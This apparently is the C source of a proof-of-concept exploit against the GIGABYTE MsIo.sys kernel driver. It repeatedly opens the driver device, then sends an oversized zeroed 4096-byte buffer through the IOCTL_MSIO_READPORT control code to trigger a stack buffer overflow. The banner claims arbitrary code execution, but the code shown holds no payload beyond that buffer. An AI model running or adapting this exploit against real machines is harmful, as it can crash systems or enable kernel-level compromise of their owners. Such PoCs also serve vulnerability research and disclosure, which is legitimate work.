#include "poc.h"

int main(int argc, char** argv)
{
	char unused = 0, output[4096], input[4096];
	HANDLE h_driver = (HANDLE)-1;
	unsigned long bytes_returned = 0;

	RtlSecureZeroMemory(&input, sizeof(input));
	RtlSecureZeroMemory(&output, sizeof(output));

	system("title poc | color f");

	printf("[!] GIGABYTE MsIo.sys Stack-based Buffer Overlow Arbitrary Code Execution Proof-of-Concept Exploit\n[!] Written by ExAllocatePool2.\n[!] Lets exploit!\n[*] Racing to obtain a driver handle...");

	while (h_driver == (HANDLE)-1)
	{
		h_driver = CreateFileA(TARGET_DEVICE, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	}
	printf("\n[+] Obtained a driver handle. Handle Value: 0x%p", h_driver);

	DeviceIoControl(h_driver, IOCTL_MSIO_READPORT, &input, sizeof(input), &output, sizeof(output), &bytes_returned, 0);

	unused = getchar();

	return 0;
}